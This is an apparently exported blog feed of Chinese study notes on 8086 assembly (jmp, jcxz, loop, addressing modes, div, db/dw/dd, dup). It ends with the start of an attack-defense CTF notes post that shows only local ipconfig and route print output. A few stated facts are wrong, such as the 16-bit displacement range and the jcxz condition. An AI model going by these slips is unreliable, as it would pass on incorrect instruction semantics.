        <content type="html"><![CDATA[<h2 id="汇编指令与机器码的对应示例"><a href="#汇编指令与机器码的对应示例" class="headerlink" title="汇编指令与机器码的对应示例"></a>汇编指令与机器码的对应示例</h2><table><thead><tr><th align="center">汇编指令</th><th align="center">机器指令</th></tr></thead><tbody><tr><td align="center">mov ax,0123</td><td align="center">B8 23 01</td></tr><tr><td align="center">mov ax,ds:[0123]</td><td align="center">A1 23 01</td></tr><tr><td align="center">push ds:[0123]</td><td align="center">FF 36 23 01</td></tr></tbody></table><p>可以看到，在一般的汇编指令中，汇编指令中的idata(立即数)，不论它是表示一个数据还是内存单元的偏移地址，都会在对应的机器指令中出现</p><h2 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h2><p>8086CPU的转移指令分为以下几类</p><ul><li>无条件转移指令（如：jump）</li><li>条件转移指令</li><li>循环指令（如：loop）</li><li>过程（函数）</li><li>中断</li></ul><h2 id="操作符offset"><a href="#操作符offset" class="headerlink" title="操作符offset"></a>操作符offset</h2><p>操作符offset的功能是取得标号的偏移地址(相对于当前段地址)</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,offset start;相当于mov ax,0 (cs:offset start)</span><br><span class="line">s: mov ax,offset s   ;相当于mov ax,3(cs:offset s)</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h2><p>jmp为无条件转移，可以只修改IP，也可以同时修改CS和IP，同时jmp指令需要给出两种信息：</p><ul><li>转移的目的地址</li><li>转移的距离（段间转移、段内短转移、段内近转移）</li></ul><h4 id="依据位移进行转移的jmp指令"><a href="#依据位移进行转移的jmp指令" class="headerlink" title="依据位移进行转移的jmp指令"></a>依据位移进行转移的jmp指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short 标号（转移到标号处执行指令）</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是<strong>段内短转移</strong>，它对IP的修改范围为<strong>-128~127</strong>，也就是说它向前转移时可以最多越过<strong>128</strong>个字节，向后转移可以最多越过<strong>127</strong>个字节</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,0</span><br><span class="line">jmp short s</span><br><span class="line">add ax,1</span><br><span class="line">s: inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>实际上指令<code>jmp short 标号</code>的功能为(IP)=(IP)+8位位移</p><ul><li>8位位移 = “标号”处的地址 - jmp指令后的第一个字节的地址</li><li>short指明此处的位移为8位位移</li><li>8位位移的范围为-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure><p>这个指令实现的是段内近转移，即(IP)=(IP)+16位位移</p><ul><li>16位移 = “标号”处的地址 - jmp指令后的第一个字节的地址</li><li>near ptr指明此处的位移为16位位移</li><li>16位位移的范围为-32769~32767，用补码表示</li><li>16位位移由编译程序在编译时算出</li></ul><h4 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure><p>实现的是段间转移，又称为远转移</p><ul><li>（CS）= 标号所在段的段地址</li><li>（IP） = 标号所在段中的偏移地址</li><li>far ptr 指明了指令用标号的段地址和偏移地址修改了CS和IP</li></ul><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,0</span><br><span class="line">mov bx,0</span><br><span class="line">jmp far ptr s</span><br><span class="line">db 256 dup(0)</span><br><span class="line">s: add ax,1</span><br><span class="line">inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h4 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 16位寄存器</span><br></pre></td></tr></table></figure><p>功能：（IP）= （16位寄存器）</p><h4 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp word ptr 内存单元地址（段内转移）</span><br></pre></td></tr></table></figure><p>功能：从内存单元地址处开始存放着一个字型数据，是转移的目的偏移地址，内存单元地址可用寻址方式的任一格式给出</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp dword ptr 内存单元地址（段内转移）</span><br></pre></td></tr></table></figure><p>功能：从内存单元地址处开始存放着两个字型数据，高地址处的字是转移的目的段地址，低地址是转移的目的偏移地址，内存单元地址可用寻址方式的任一格式给出</p><ul><li>（CS）=（内存单元地址+2）</li><li>（IP）=（内存单元地址）</li></ul><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">movword ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">movword ptr [bx+2],0</span><br><span class="line">jmp dword ptr [bx]</span><br></pre></td></tr></table></figure><h2 id="jcxz指令"><a href="#jcxz指令" class="headerlink" title="jcxz指令"></a>jcxz指令</h2><p>jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为<strong>-128~127</strong>，一般的有条件转移指令看的都是cx寄存器，例如loop指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jcxz 标号（如果（cx）=0，则转移到标号初执行）</span><br></pre></td></tr></table></figure><p>jcxz实际的指令操作：</p><ul><li>当（cx）= 0时，（IP）=（IP）+ 8位位移<ul><li>8位位移 = “标号”处的地址 - jcxz指令后的第一个字节的地址</li><li>8位位移的范围为-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul></li><li>当（cx）=0时，什么也不做（程序向下执行）</li></ul><p>其实也可以理解为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if((cx)==0)</span><br><span class="line">jmp short 标号</span><br></pre></td></tr></table></figure><h2 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h2><p>loop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为<strong>-128~127</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loop 标号</span><br></pre></td></tr></table></figure><p>loop实际的指令操作：</p><ul><li><p>（cx）=（cx）- 1</p></li><li><p>当（cx）！= 0时，（IP）=（IP）+ 8位位移</p><ul><li>8位位移 = “标号”处的地址 - loop指令后的第一个字节的地址</li><li>8位位移的范围为-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul></li><li><p>当（cx）=0时，什么也不做（程序向下执行）</p></li></ul><p>其实也可以理解为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(cx)--;</span><br><span class="line">if((cx)!=0)</span><br><span class="line">jmp short 标号</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编笔记01</title>
      <link href="/2020/02/04/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F01/"/>
      <url>/2020/02/04/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F01/</url>
      
        <content type="html"><![CDATA[<h2 id="reg-sreg"><a href="#reg-sreg" class="headerlink" title="reg/sreg"></a>reg/sreg</h2><h4 id="reg-寄存器"><a href="#reg-寄存器" class="headerlink" title="reg:寄存器"></a>reg:寄存器</h4><p>reg的集合包括:ax,bx,cx,dx,ah,al,bh,bl,ch,cl,dh,dl,sp,bp,si,di</p><h4 id="sreg：段寄存器"><a href="#sreg：段寄存器" class="headerlink" title="sreg：段寄存器"></a>sreg：段寄存器</h4><p>sreg的集合包括:ds,ss,cs,es</p><h2 id="bx-si-di-bp"><a href="#bx-si-di-bp" class="headerlink" title="bx,si,di,bp"></a>bx,si,di,bp</h2><ul><li>在8086CPU中，只有这4个寄存器（bx,bp,si,di）可以用在<code>[…]</code>中来进行内存单元的寻址<ul><li>正确的指令形式:<code>mov ax,[bx]</code> <code>mov ax,[bx+si]</code></li><li>错误的指令形式:<code>mov ax,[cx]</code> <code>mov ax,[ax]</code></li></ul></li><li>在<code>[…]</code>中这4个寄存器可以单个出现，或只能以四种组合出现：bx和si、bx和di、bp和si、bp和di<ul><li>错误的用法：<code>mov ax,[bx+bp]</code>  <code>mov ax,[si+di]</code></li></ul></li><li>只要在<code>[…]</code>中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在ss中</li></ul><h2 id="数据的位置"><a href="#数据的位置" class="headerlink" title="数据的位置"></a>数据的位置</h2><p>汇编语言用三个概念来表示数据的位置</p><ul><li>立即数（idata）<ul><li>对于直接包含在机器指令中的数据（执行前在CPU的指令缓冲器中），例如<code>mov ax.1</code>中的1即为立即数</li></ul></li><li>寄存器</li><li>段地址（SA）和偏移地址（EA）<ul><li>存放段地址的寄存器可以是默认的<ul><li>默认在ds中的场景<ul><li>mov ax,[0]</li><li>mov ax,[bx]</li><li>mov ax,[bx+8]</li><li>mov ax,[bx+si]</li><li>mov ax,[bx+si+8]</li></ul></li><li>默认在ss中的场景<ul><li>mov ax,[bp]</li><li>mov ax,[bp+8]</li><li>mov ax,[bp+si]</li><li>mov ax,[bp+si+8]</li></ul></li></ul></li><li>存放段地址的寄存器也可以显性的给出<ul><li>mov ax,ds:[bp]</li><li>mov ax,es:[bx]</li><li>mov ax,ss:[bx+si]</li><li>mov ax,cs:[bx+si+8]</li></ul></li></ul></li></ul><h2 id="数据的长度"><a href="#数据的长度" class="headerlink" title="数据的长度"></a>数据的长度</h2><p>8086CPU的指令可以处理两种尺寸的数据，字节（byte）和字（word），所以在机器指令中要指明，指令进行的是字操作还是字节操作，在32位处理器中还引入了双字（double word），在64位处理器还引入了四字</p><ul><li>通过寄存器名指明要处理的数据的尺寸<ul><li>指明了是字（word）操作<ul><li>mov ax,1</li><li>mov bx,ds:[0]</li><li>mov ds,ax</li><li>mov ds:[0],ax</li><li>inc ax</li><li>add ax,1000</li></ul></li><li>指明了是字节（byte）操作<ul><li>mov al,1</li><li>mov al,bl</li><li>mov al,ds:[0]</li><li>mov ds:[0],al</li><li>inc al</li><li>add al,100</li></ul></li></ul></li><li>在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在8086汇编指令中可以为word或byte<ul><li>用word ptr指明访问字（word）单元<ul><li>mov word ptr ds:[0],1</li><li>inc word ptr [bx]</li><li>inc word ptr ds:[0]</li><li>add word ptr [bx],2</li></ul></li><li>用byte ptr指明访问字节（byte）单元</li></ul></li><li>其他方法<ul><li>有些指令默认了访问的是字节（byte）或字（word）<ul><li>push指令只进行字（word）操作：<code>push [1000H]</code></li></ul></li></ul></li></ul><h2 id="结构化访问数据"><a href="#结构化访问数据" class="headerlink" title="结构化访问数据"></a>结构化访问数据</h2><p>一般来说我们可以用[bx+idata+si]的方式来进行访问结构体中的数据</p><ul><li>用bx定位整个结构体</li><li>用idata定位结构体中的某一个数据项</li><li>用si定位数组项中的每个元素</li></ul><p>所以也可以使用更方便的写法，例如：<code>[bx].idata</code>  <code>[bx].idata[si]</code></p><h2 id="div"><a href="#div" class="headerlink" title="div"></a>div</h2><p>div是除法指令（division），使用div作除法的时候</p><ul><li>除数：8位或16位，在寄存器或内存单元中</li><li>被除数：（默认）放在AX或DX和AX中</li></ul><table><thead><tr><th align="center">除数</th><th align="center">被除数</th></tr></thead><tbody><tr><td align="center">8位</td><td align="center">16位（AX）</td></tr><tr><td align="center">16位</td><td align="center">32位（DX+AX）</td></tr></tbody></table><table><thead><tr><th align="center">运算</th><th align="center">8位</th><th align="center">16位</th></tr></thead><tbody><tr><td align="center">商</td><td align="center">AL</td><td align="center">AX</td></tr><tr><td align="center">余数</td><td align="center">AH</td><td align="center">DX</td></tr></tbody></table><p>div指令格式：</p><ul><li>div reg</li><li>div 内存单元<ul><li>div byte ptr ds:[0]</li><li>div word ptr es:[0]</li></ul></li></ul><h2 id="db、dw、dd"><a href="#db、dw、dd" class="headerlink" title="db、dw、dd"></a>db、dw、dd</h2><h4 id="db"><a href="#db" class="headerlink" title="db"></a><strong>db</strong></h4><p>db在汇编中表示一个byte，就是一个字节8位，每次读取数据时，读完一个偏移量加1 </p><h4 id="dw"><a href="#dw" class="headerlink" title="dw"></a><strong>dw</strong></h4><p>dw在汇编中表示一个字（word），就是两个字节16位，每次读取数据时，读完一个偏移量加2</p><p><strong>dd</strong></p><p>dd在汇编中表示一个双字，就是四个字节32位，每次读取数据时，读完一个偏移量加4</p><h2 id="dup"><a href="#dup" class="headerlink" title="dup"></a>dup</h2><p>dup和db、dw、dd等数据定义伪指令配合使用的，来进行数据的重复</p><ul><li>db 重复的次数 dup (重复的字节型数据)</li><li>dw 重复的次数 dup (重复的字型数据)</li><li>dd 重复的次数 dup (重复的双字型数据)</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ul><li>db 3 dup(0)<ul><li>定义了3个字节，他们的值都是0，相当于db 0,0,0</li></ul></li><li>db 3 dup(0,1,2)<ul><li>定义了9个字节，他们的值是(0,1,2,0,1,2,0,1,2)，相当于db 0,1,2,0,1,2,0,1,2</li></ul></li><li>db 3 dup(‘abc’,’ABC’)<ul><li>定义了18个字节，他们的值是(‘abcABCabcABCabcABC’)，相当于db ‘abcABCabcABCabcABC’</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>8086内存寻址方式小结</title>
      <link href="/2020/02/02/8086%E2%94%80%E2%94%8C%E2%94%A4%C2%B5%E2%95%A4%E2%96%91%E2%95%93%E2%95%96%E2%95%96%E2%95%9C%E2%95%A9%E2%95%9C%E2%95%A8%C3%AD%E2%95%9C%C3%9F/"/>
      <url>/2020/02/02/8086%E2%94%80%E2%94%8C%E2%94%A4%C2%B5%E2%95%A4%E2%96%91%E2%95%93%E2%95%96%E2%95%96%E2%95%9C%E2%95%A9%E2%95%9C%E2%95%A8%C3%AD%E2%95%9C%C3%9F/</url>
      
        <content type="html"><![CDATA[<p>8086内存寻址的段地址寄存器默认为ds，主要有以下几种方式</p><ol><li><code>[idata]</code>用一个常量来表示地址，可用于直接定位一个内存单元，例如<code>mov ax,[2]</code>，结果就是<code>(ax)=(ds)*16+idata</code></li><li><code>[bx]</code>用一个变量来表示内存地址，可用于间接定位一个内存单元，例如<code>mov ax,[bx]</code>，结果就是<code>(ax)=(ds)*16+bx</code></li><li><code>[bx+idata]</code>用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元，例如<code>mov ax,[bx+8]</code>或者<code>mov ax,8[bx]</code>，结果就是<code>（ax)=(ds)*16+(bx)+idata</code></li><li><code>[bx+si]</code>用两个变量表示地址，例如<code>mov ax,[bx+si+8]</code>或者<code>mov ax,8[bx+si]</code>，结果就是<code>（ax)=(ds)*16+(bx)+(si)+idata</code></li></ol><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(157).png" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AWD线下赛笔记</title>
      <link href="/2019/12/30/AWD%E2%95%A7%E2%96%80%E2%95%A7%E2%94%AC%E2%95%9A%E2%81%BF%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F/"/>
      <url>/2019/12/30/AWD%E2%95%A7%E2%96%80%E2%95%A7%E2%94%AC%E2%95%9A%E2%81%BF%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="配置路由表"><a href="#配置路由表" class="headerlink" title="配置路由表"></a>配置路由表</h2><p>首先调用<code>ipconfig</code>查看本机网络状况</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\syc&gt; ipconfig</span><br><span class="line">Windows IP 配置</span><br><span class="line">以太网适配器 vEthernet (Default <span class="keyword">Switch</span>):</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">861</span>:<span class="number">2</span>a51:<span class="number">6</span>e5a:<span class="number">761</span>b%<span class="number">9</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">172.17</span>.<span class="number">126.97</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.240</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">以太网适配器 以太网:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">716</span>b:<span class="number">1</span>e8e:e67a:bdf%<span class="number">20</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">10.0</span>.<span class="number">10.2</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">以太网适配器 以太网 <span class="number">2</span>:</span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">以太网适配器 VirtualBox Host-Only Network:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">40</span>de:<span class="number">409</span>b:e37f:<span class="number">34</span>eb%<span class="number">4</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">以太网适配器 VirtualBox Host-Only Network <span class="comment">#2:</span></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::cd1f:a63d:<span class="number">6</span>cee:c094%<span class="number">17</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">201.2</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">无线局域网适配器 本地连接* <span class="number">1</span>:</span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">无线局域网适配器 本地连接* <span class="number">3</span>:</span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">以太网适配器 VMware Network Adapter VMnet1:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">9401</span>:d238:<span class="number">7</span>f61:d7d3%<span class="number">7</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">61.1</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">以太网适配器 VMware Network Adapter VMnet8:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">907</span>b:<span class="number">8932</span>:<span class="number">6</span>a09:c20b%<span class="number">10</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">159.1</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">无线局域网适配器 WLAN:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   IPv6 地址 . . . . . . . . . . . . : <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39:<span class="number">4438</span>:<span class="number">1682</span>:<span class="number">19</span>e2:<span class="number">8070</span></span><br><span class="line">   临时 IPv6 地址. . . . . . . . . . : <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39:<span class="number">6513</span>:<span class="number">5</span>ca8:<span class="number">8</span>df0:e7f</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">4438</span>:<span class="number">1682</span>:<span class="number">19</span>e2:<span class="number">8070</span>%<span class="number">16</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">43.65</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . : fe80::<span class="number">90</span>f0:<span class="number">52</span>ff:fe0e:<span class="number">4</span>b86%<span class="number">16</span></span><br><span class="line">以太网适配器 蓝牙网络连接:</span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br></pre></td></tr></table></figure><p>然后调用<code>route print</code>查看本机路由表情况</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\syc&gt; route print</span><br><span class="line">===========================================================================</span><br><span class="line">接口列表</span><br><span class="line">  <span class="number">9</span>...<span class="number">00</span> <span class="number">15</span> <span class="number">5</span>d bf b4 b8 ......Hyper-V Virtual Ethernet Adapter</span><br><span class="line"> <span class="number">20</span>...<span class="number">80</span> e8 <span class="number">2</span>c <span class="number">1</span>a <span class="number">31</span> <span class="number">4</span>d ......Realtek PCIe GbE Family Controller</span><br><span class="line"> <span class="number">21</span>...<span class="number">08</span> <span class="number">00</span> <span class="number">58</span> <span class="number">00</span> <span class="number">00</span> <span class="number">05</span> ......SSL VPN Client Virtual Network Adapter</span><br><span class="line">  <span class="number">4</span>...<span class="number">0</span>a <span class="number">00</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> ......VirtualBox Host-Only Ethernet Adapter</span><br><span class="line"> <span class="number">17</span>...<span class="number">0</span>a <span class="number">00</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">11</span> ......VirtualBox Host-Only Ethernet Adapter <span class="comment">#2</span></span><br><span class="line"> <span class="number">25</span>...f2 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Microsoft Wi-Fi Direct Virtual Adapter</span><br><span class="line"> <span class="number">15</span>...b2 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Microsoft Wi-Fi Direct Virtual Adapter <span class="comment">#3</span></span><br><span class="line">  <span class="number">7</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> c0 